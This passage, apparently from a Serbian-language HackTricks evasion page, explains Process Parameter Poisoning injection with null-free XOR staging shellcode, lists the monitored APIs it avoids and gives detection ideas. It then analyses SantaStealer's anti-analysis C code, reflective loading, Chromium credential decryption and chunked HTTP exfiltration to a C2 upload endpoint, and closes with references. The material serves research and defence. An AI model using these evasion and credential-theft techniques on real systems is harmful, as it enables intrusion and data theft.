2. Učiniti izabranu stranicu parametara izvršnom pomoću `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponovo iskoristiti handle glavne niti koji je već vraćen u `PROCESS_INFORMATION`
4. Preusmeriti izvršavanje pomoću `NtSetContextThread` (`CONTEXT_CONTROL`, prepisivanje `RIP`)

Za razliku od klasičnih workflow-a za hijacking niti, ovo **ne zahteva** `SuspendThread` / `ResumeThread`; context se može direktno promeniti na vraćenom handle-u glavne niti.

Time se izbegava nekoliko API-ja koji se obično nadziru zbog injection-a:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- često i `SuspendThread` / `ResumeThread`

### Ograničenje null bajta i staged shellcode

Sva tri carrier-a su **string ili string-like podaci**, pa se raw payload koji sadrži `0x00` skraćuje tokom prenosa. Praktično rešenje je **null-free first stage** koji rekonstruiše konstante tokom izvršavanja, a zatim učitava proizvoljni second stage.

Jednostavan obrazac je XOR-based synthesis konstanti:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Ovo omogućava da first stage izgradi stringove na steku, API argumente, putanje do DLL-ova ili loader za shellcode druge faze bez ubacivanja null bajtova u transportovani parametar.

### Stack-based API calls from the first stage

Kada first stage mora da pozove API-je kao što je `LoadLibraryA`, može da:

- postavi string/bufer na stek ciljnog procesa
- rezerviše **32-byte x64 shadow space**
- postavi `RCX`, `RDX`, `R8`, `R9` na konstante ili pokazivače relativne u odnosu na `RSP`
- zadrži `RSP` **16-byte aligned** pre poziva

Second stage se zatim može kopirati sa steka u `PAGE_READWRITE` alokaciju, promeniti u `PAGE_EXECUTE_READ` pomoću `VirtualProtect`, a zatim se može izvršiti skok na njega, čime se izbegava direktna RWX alokacija.

### Detection ideas

Dobre mogućnosti za hunting koje su autori pomenuli:

- `VirtualProtectEx` / `NtProtectVirtualMemory` koji stranice sa parametrima procesa čine izvršivim
- ta promena zaštite praćena pozivom `SetThreadContext` / `NtSetContextThread`
- udaljena čitanja `PEB`-a, a zatim `RTL_USER_PROCESS_PARAMETERS`
- neuobičajeno dugački / entropijski bogati `lpCommandLine`, `lpEnvironment` ili `STARTUPINFO.lpReserved` podaci tokom kreiranja procesa

### Notes

- P3 je **cross-process transfer trick**, a ne potpuna execution primitive sam po sebi: kopirani parametar i dalje zahteva promenu dozvole za izvršavanje i metod za preusmeravanje izvršavanja.
- Autori su razmatrali `RtlCreateProcessReflection` / Dirty Vanity, ali su ga odbacili zato što interno dolazi do sumnjivih primitiva kao što su `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (poznat i kao BluelineStealer) pokazuje kako moderni info-stealeri kombinuju AV bypass, anti-analysis i pristup kredencijalima u jedinstvenom workflow-u.<sup>[[24]](#references)</sup>

### Keyboard layout gating & sandbox delay

- Config flag (`anti_cis`) nabraja instalirane rasporede tastature pomoću `GetKeyboardLayoutList`. Ako se pronađe ćirilični raspored, sample kreira prazan `CIS` marker i prekida rad pre pokretanja stealera, čime obezbeđuje da se nikada ne aktivira na isključenim lokalizacijama, dok istovremeno ostavlja hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Slojevita logika `check_antivm`

- Varijanta A prolazi kroz listu procesa, hešira svaki naziv prilagođenim rolling checksum algoritmom i upoređuje ga sa ugrađenim blocklistama za debuggere/sandbox okruženja; ponavlja checksum nad nazivom računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B proverava sistemska svojstva (minimalan broj procesa, nedavno vreme pokretanja), poziva `OpenServiceA("VBoxGuest")` radi detekcije VirtualBox dodataka i vrši provere vremena oko sleep operacija kako bi otkrila single-stepping. Svaki pogodak prekida izvršavanje pre pokretanja modula.

### Fileless helper + double ChaCha20 reflective loading

- Primarni DLL/EXE sadrži Chromium credential helper koji se ili zapisuje na disk ili se ručno mapira u memoriju; fileless režim sam rešava importe/relokacije, tako da se helper artifacts ne upisuju.
- Taj helper čuva DLL druge faze dvostruko šifrovan pomoću ChaCha20 (dva ključa od 32 bajta + nonce-ovi od 12 bajtova). Nakon oba prolaza, reflectively učitava blob (bez `LoadLibrary`) i poziva exporte `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, izvedene iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- ChromElevator rutine koriste direct-syscall reflective process hollowing za injection u aktivan Chromium browser, nasleđuju AppBound Encryption ključeve i dešifruju lozinke/cookies/credit cards direktno iz SQLite baza, uprkos ABE hardeningu.


### Modularno in-memory prikupljanje i chunked HTTP exfil

- `create_memory_based_log` prolazi kroz globalnu tabelu pokazivača na funkcije `memory_generators` i pokreće po jedan thread za svaki omogućen modul (Telegram, Discord, Steam, screenshots, documents, browser extensions itd.). Svaki thread upisuje rezultate u deljene buffere i prijavljuje broj svojih fajlova nakon ~45 sekundi čekanja na join.
- Po završetku, sve se zipuje pomoću statički linkovane `miniz` biblioteke kao `%TEMP%\\Log.zip`. `ThreadPayload1` zatim čeka 15 sekundi i šalje arhivu u chunkovima od 10 MB putem HTTP POST zahteva na `http://<C2>:6767/upload`, lažirajući browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Svaki chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opcioni `w: <campaign_tag>`, a poslednji chunk dodaje `complete: true` kako bi C2 znao da je ponovno sastavljanje završeno.

## References

- [1] [Napredne Evasion Tradecraft tehnike: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, više nema besplatnih prolaza za malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacija](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – primer](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – primer](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Novi lanac infekcije i obfuskacija zasnovana na ConfuserEx za DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Da li treba verovati svom zero trust modelu? Zaobilaženje Zscaler posture provera](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Pre ToolShell-a: Istraživanje prethodnih ransomware operacija grupe Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Zloupotreba prosleđenih exporta](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar prosleđenih exporta za Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Redosled pretrage dynamic-link biblioteka](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Bezbednost procesa i prava pristupa](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU referenca (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Suprotstavljanje EDR sistemima uz podršku Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Probijanje zaštitne ljuske Windows Defendera tehnikom preusmeravanja foldera](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – referenca za mklink komandu](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Ispod Pure Curtain-a: Od RAT-a do buildera i codera](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer dolazi u grad: Novi, ambiciozni infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Poraz Node.js malware-a pomoću API tracinga](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Stavljanje Adaptix-a na spavanje pomoću Crystal Palace-a](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET i Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Sakrivanje Dotnet Etw-a](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Zloupotreba Chrome Remote Desktop-a u Red Team operacijama: praktičan vodič](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Pretvaranje Defenderovog remediation drivera u kernel operation primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Prateći kod za MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Kreiranje self-masking funkcija pomoću LLVM-a](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
